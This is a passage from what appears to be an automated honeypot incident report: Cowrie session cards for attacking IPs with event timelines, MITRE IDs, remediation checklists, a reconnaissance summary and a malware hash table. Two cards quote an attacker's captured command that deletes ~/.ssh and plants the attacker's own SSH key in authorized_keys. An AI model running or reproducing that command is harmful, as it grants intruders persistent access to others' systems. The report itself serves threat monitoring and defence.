| **Last Seen** | 2026-08-08 10:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:29:00` | `cowrie.session.connect` |
| `2026-08-08 10:29:00` | `cowrie.client.version` |
| `2026-08-08 10:29:00` | `cowrie.client.kex` |
| `2026-08-08 10:29:01` | `cowrie.login.success` |
| `2026-08-08 10:29:02` | `cowrie.session.params` |
| `2026-08-08 10:29:02` | `cowrie.command.input` |
| `2026-08-08 10:29:03` | `cowrie.log.closed` |
| `2026-08-08 10:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.42.60[.]82` to AbuseIPDB if not already reported
- [ ] Block `111.42.60[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb2f9ac3c1fc

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-08 10:36 |
| **Last Seen** | 2026-08-08 10:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:36:51` | `cowrie.session.connect` |
| `2026-08-08 10:36:52` | `cowrie.client.version` |
| `2026-08-08 10:36:52` | `cowrie.client.kex` |
| `2026-08-08 10:36:53` | `cowrie.login.success` |
| `2026-08-08 10:36:53` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-928edaf3a929

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-08-08 10:37 |
| **Last Seen** | 2026-08-08 10:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:37:03` | `cowrie.session.connect` |
| `2026-08-08 10:37:04` | `cowrie.client.version` |
| `2026-08-08 10:37:04` | `cowrie.client.kex` |
| `2026-08-08 10:37:05` | `cowrie.login.success` |
| `2026-08-08 10:37:06` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b4cffbf4687

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-08-08 10:37 |
| **Last Seen** | 2026-08-08 10:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:37:05` | `cowrie.session.connect` |
| `2026-08-08 10:37:05` | `cowrie.client.version` |
| `2026-08-08 10:37:05` | `cowrie.client.kex` |
| `2026-08-08 10:37:06` | `cowrie.login.success` |
| `2026-08-08 10:37:07` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59f825278138

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-08-08 10:37 |
| **Last Seen** | 2026-08-08 10:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:37:12` | `cowrie.session.connect` |
| `2026-08-08 10:37:13` | `cowrie.client.version` |
| `2026-08-08 10:37:13` | `cowrie.client.kex` |
| `2026-08-08 10:37:15` | `cowrie.login.success` |
| `2026-08-08 10:37:16` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50fbe59a6eb1

| Field | Detail |
|---|---|
| **Source IP** | `54.38.180[.]48` |
| **First Seen** | 2026-08-08 10:40 |
| **Last Seen** | 2026-08-08 10:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:40:10` | `cowrie.session.connect` |
| `2026-08-08 10:40:10` | `cowrie.client.version` |
| `2026-08-08 10:40:10` | `cowrie.client.kex` |
| `2026-08-08 10:40:11` | `cowrie.login.success` |
| `2026-08-08 10:40:12` | `cowrie.session.params` |
| `2026-08-08 10:40:12` | `cowrie.command.input` |
| `2026-08-08 10:40:12` | `cowrie.command.failed` |
| `2026-08-08 10:40:12` | `cowrie.log.closed` |
| `2026-08-08 10:40:12` | `cowrie.session.params` |
| `2026-08-08 10:40:12` | `cowrie.command.input` |
| `2026-08-08 10:40:13` | `cowrie.session.file_download` |
| `2026-08-08 10:40:13` | `cowrie.log.closed` |
| `2026-08-08 10:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.38.180[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.38.180[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a669d0afe16

| Field | Detail |
|---|---|
| **Source IP** | `54.38.180[.]48` |
| **First Seen** | 2026-08-08 10:40 |
| **Last Seen** | 2026-08-08 10:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:40:13` | `cowrie.session.connect` |
| `2026-08-08 10:40:13` | `cowrie.client.version` |
| `2026-08-08 10:40:13` | `cowrie.client.kex` |
| `2026-08-08 10:40:13` | `cowrie.login.success` |
| `2026-08-08 10:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.38.180[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.38.180[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda3ad75b2bf

| Field | Detail |
|---|---|
| **Source IP** | `54.38.180[.]48` |
| **First Seen** | 2026-08-08 10:40 |
| **Last Seen** | 2026-08-08 10:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:40:13` | `cowrie.session.connect` |
| `2026-08-08 10:40:13` | `cowrie.client.version` |
| `2026-08-08 10:40:13` | `cowrie.client.kex` |
| `2026-08-08 10:40:14` | `cowrie.login.success` |
| `2026-08-08 10:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.38.180[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.38.180[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa4657e73c75

| Field | Detail |
|---|---|
| **Source IP** | `177.5.74[.]41` |
| **First Seen** | 2026-08-08 10:43 |
| **Last Seen** | 2026-08-08 10:46 |
| **Session Duration** | 183s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:43:09` | `cowrie.session.connect` |
| `2026-08-08 10:43:11` | `cowrie.telnet.option` |
| `2026-08-08 10:43:12` | `cowrie.telnet.option` |
| `2026-08-08 10:43:12` | `cowrie.login.success` |
| `2026-08-08 10:43:13` | `cowrie.session.params` |
| `2026-08-08 10:46:13` | `cowrie.log.closed` |
| `2026-08-08 10:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.5.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `177.5.74[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bdf0320dbc6

| Field | Detail |
|---|---|
| **Source IP** | `172.190.24[.]225` |
| **First Seen** | 2026-08-08 10:44 |
| **Last Seen** | 2026-08-08 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:44:07` | `cowrie.session.connect` |
| `2026-08-08 10:44:07` | `cowrie.client.version` |
| `2026-08-08 10:44:07` | `cowrie.client.kex` |
| `2026-08-08 10:44:07` | `cowrie.login.success` |
| `2026-08-08 10:44:08` | `cowrie.session.params` |
| `2026-08-08 10:44:08` | `cowrie.command.input` |
| `2026-08-08 10:44:08` | `cowrie.command.failed` |
| `2026-08-08 10:44:08` | `cowrie.log.closed` |
| `2026-08-08 10:44:08` | `cowrie.session.params` |
| `2026-08-08 10:44:08` | `cowrie.command.input` |
| `2026-08-08 10:44:08` | `cowrie.session.file_download` |
| `2026-08-08 10:44:08` | `cowrie.log.closed` |
| `2026-08-08 10:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.24[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.190.24[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7ed29e3986

| Field | Detail |
|---|---|
| **Source IP** | `172.190.24[.]225` |
| **First Seen** | 2026-08-08 10:44 |
| **Last Seen** | 2026-08-08 10:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:44:08` | `cowrie.session.connect` |
| `2026-08-08 10:44:08` | `cowrie.client.version` |
| `2026-08-08 10:44:08` | `cowrie.client.kex` |
| `2026-08-08 10:44:08` | `cowrie.login.success` |
| `2026-08-08 10:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.24[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.190.24[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b39d146b769a

| Field | Detail |
|---|---|
| **Source IP** | `172.190.24[.]225` |
| **First Seen** | 2026-08-08 10:44 |
| **Last Seen** | 2026-08-08 10:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:44:08` | `cowrie.session.connect` |
| `2026-08-08 10:44:08` | `cowrie.client.version` |
| `2026-08-08 10:44:08` | `cowrie.client.kex` |
| `2026-08-08 10:44:08` | `cowrie.login.success` |
| `2026-08-08 10:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.24[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.190.24[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d7893b041d9

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-08-08 10:44 |
| **Last Seen** | 2026-08-08 10:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:44:25` | `cowrie.session.connect` |
| `2026-08-08 10:44:26` | `cowrie.client.version` |
| `2026-08-08 10:44:26` | `cowrie.client.kex` |
| `2026-08-08 10:44:27` | `cowrie.login.success` |
| `2026-08-08 10:44:28` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f782a46c96

| Field | Detail |
|---|---|
| **Source IP** | `124.67.120[.]106` |
| **First Seen** | 2026-08-08 10:44 |
| **Last Seen** | 2026-08-08 10:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:44:33` | `cowrie.session.connect` |
| `2026-08-08 10:44:34` | `cowrie.client.version` |
| `2026-08-08 10:44:34` | `cowrie.client.kex` |
| `2026-08-08 10:44:36` | `cowrie.login.success` |
| `2026-08-08 10:44:37` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.67.120[.]106` to AbuseIPDB if not already reported
- [ ] Block `124.67.120[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b9c053b79a9

| Field | Detail |
|---|---|
| **Source IP** | `163.223.244[.]3` |
| **First Seen** | 2026-08-08 10:48 |
| **Last Seen** | 2026-08-08 10:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:48:12` | `cowrie.session.connect` |
| `2026-08-08 10:48:13` | `cowrie.client.version` |
| `2026-08-08 10:48:13` | `cowrie.client.kex` |
| `2026-08-08 10:48:14` | `cowrie.login.success` |
| `2026-08-08 10:48:15` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.223.244[.]3` to AbuseIPDB if not already reported
- [ ] Block `163.223.244[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5505370f85ec

| Field | Detail |
|---|---|
| **Source IP** | `177.174.89[.]99` |
| **First Seen** | 2026-08-08 10:48 |
| **Last Seen** | 2026-08-08 10:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:48:20` | `cowrie.session.connect` |
| `2026-08-08 10:48:21` | `cowrie.client.version` |
| `2026-08-08 10:48:21` | `cowrie.client.kex` |
| `2026-08-08 10:48:22` | `cowrie.login.success` |
| `2026-08-08 10:48:23` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.89[.]99` to AbuseIPDB if not already reported
- [ ] Block `177.174.89[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **8** | 2026-08-08 08:56 | 2026-08-08 10:52 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-08 09:00 | 2026-08-08 10:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-08-08 10:37 | 2026-08-08 10:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | **3** | 2026-08-08 10:11 | 2026-08-08 10:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-08-08 09:12 | 2026-08-08 09:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.242.104[.]81` | **2** | 2026-08-08 09:05 | 2026-08-08 10:31 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]227` | **2** | 2026-08-08 09:58 | 2026-08-08 09:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `190.83.64[.]220` | **2** | 2026-08-08 09:58 | 2026-08-08 09:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | **2** | 2026-08-08 08:58 | 2026-08-08 09:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `86.54.31[.]34` | **2** | 2026-08-08 08:56 | 2026-08-08 08:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **2** | 2026-08-08 10:54 | 2026-08-08 10:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.182.234[.]231` | 1 | 2026-08-08 09:05 | 2026-08-08 09:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.1.10[.]110` | 1 | 2026-08-08 10:34 | 2026-08-08 10:34 | 3s | 0 | `T1592` | 🟢 LOW |
| `111.42.60[.]82` | 1 | 2026-08-08 10:28 | 2026-08-08 10:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.140.95[.]2` | 1 | 2026-08-08 10:11 | 2026-08-08 10:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.31.180[.]18` | 1 | 2026-08-08 09:14 | 2026-08-08 09:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.35.109[.]214` | 1 | 2026-08-08 10:30 | 2026-08-08 10:30 | 1s | 0 | `T1592` | 🟢 LOW |
| `178.165.45[.]94` | 1 | 2026-08-08 09:56 | 2026-08-08 09:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.104.179[.]151` | 1 | 2026-08-08 09:55 | 2026-08-08 09:55 | 11s | 0 | `T1592` | 🟢 LOW |
| `197.156.97[.]198` | 1 | 2026-08-08 10:10 | 2026-08-08 10:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `201.214.235[.]50` | 1 | 2026-08-08 10:47 | 2026-08-08 10:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `209.97.159[.]59` | 1 | 2026-08-08 09:12 | 2026-08-08 09:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-08-08 10:34 | 2026-08-08 10:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.174.72[.]198` | 1 | 2026-08-08 09:19 | 2026-08-08 09:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `65.49.20[.]69` | 1 | 2026-08-08 10:22 | 2026-08-08 10:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]172` | 1 | 2026-08-08 10:48 | 2026-08-08 10:48 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | 1 | 2026-08-08 09:34 | 2026-08-08 09:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.214.208[.]188` | 1 | 2026-08-08 10:32 | 2026-08-08 10:32 | 11s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
